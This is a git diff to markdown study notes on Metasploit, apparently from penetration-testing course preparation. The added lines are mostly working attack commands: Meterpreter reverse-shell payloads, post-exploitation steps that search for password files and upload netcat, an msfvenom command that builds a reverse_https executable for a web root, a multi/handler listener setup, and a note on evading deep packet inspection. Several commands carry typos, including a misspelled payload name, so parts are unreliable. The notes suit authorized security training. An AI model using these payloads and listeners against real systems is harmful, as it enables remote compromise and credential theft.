@@ -1,4 +1,4 @@
-# Metasploit
+# Metasploit Pre Exploitation
 - options:
   - global variables: `set -> setg` for THREADS and/or RHOSTS, etc...
 ## Auxiliary Modules
@@ -29,3 +29,41 @@
 - `exploit`
 
 ## Payloads
+> Staged and Non staged shell code.  
+Mterpreter - staged multi-function payload that cn be extended in runtime.  
+
+- `set PAYLOAD windows/meterpreter/reverce_tcp`
+- `exploit`
+- `meterpreter > help`
+- commands
+  - `sysinfo`, `getuid`, `search -f *pass*.txt`
+  - `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`
+  - `download c:\\windows\\system32\calc.exe /tmp/calc.exe`
+  - `shell`
+  - `exit -y`
+
+## Additional payloads
+- `use windows/meterpreter/reverse_https`
+> Tunnel communication over HTTPS usil SSL, Inject he meterpreter server DLL via Reflective Dll Ijection payload (staged).
+> Helps us avoid 'deep packet inspection' services.
+- `use windows/meterpreter/reverse_tcp_allports`
+> Try to connect back to the attacker machine on all possible ports (slowly)
+
+## Binary payloads
+- `msfvenom -l`
+### The creation of the payload
+- `msfvenom -p windows/meterpreter/reverse_https LHOST=kali-ip LPORT=443 -f exe --platform windows -a x86 > /var/www/html/reverse_met_https.exe`
+### The creation of the matching listener
+> The Multihandler Module (via msfconsole)
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+show options
+set LHOST 10.11.0.179
+set LPORT 443
+exploit
+```
+## Porting Exploits to MSF
+
+# Metasploit Post Exploitation
